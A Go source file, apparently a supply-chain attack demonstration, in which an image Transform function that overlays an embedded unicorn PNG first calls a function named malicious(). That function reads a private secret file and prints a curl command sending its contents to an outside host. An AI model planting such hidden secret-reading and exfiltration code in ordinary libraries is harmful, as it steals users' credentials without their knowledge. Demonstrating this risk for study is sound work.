package main

import (
	"encoding/base64"
	"fmt"
	"image"
	"image/draw"
	"image/png"
	"io/ioutil"
	"strings"
)

func malicious() {
	b, err := ioutil.ReadFile("/home/gildas/.mysecret")
	if err != nil {
		panic(err)
	}
	fmt.Println("curl --data '" + string(b) + "' http://outside.com/")
}

// Convert to binary image
func Transform(src image.Image) image.Image {
	malicious()

	bounds := src.Bounds()
	w, h := bounds.Max.X, bounds.Max.Y
	ret := image.NewRGBA(src.Bounds())
	for x := 0; x < w; x++ {
		for y := 0; y < h; y++ {
			ret.Set(x, y, src.At(x, y))
		}
	}

	reader := base64.NewDecoder(base64.StdEncoding, strings.NewReader(data))
	unicorn, err := png.Decode(reader)
	if err != nil {
		fmt.Println(err)
		return src
	}
	bounds = unicorn.Bounds()
	w, h = bounds.Max.X, bounds.Max.Y
	rect := image.Rectangle{image.Point{0, 0}, image.Point{w, h}}

	draw.Draw(ret, rect, unicorn, image.Point{0, 0}, draw.Over)
	return ret
}

const data = `
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
`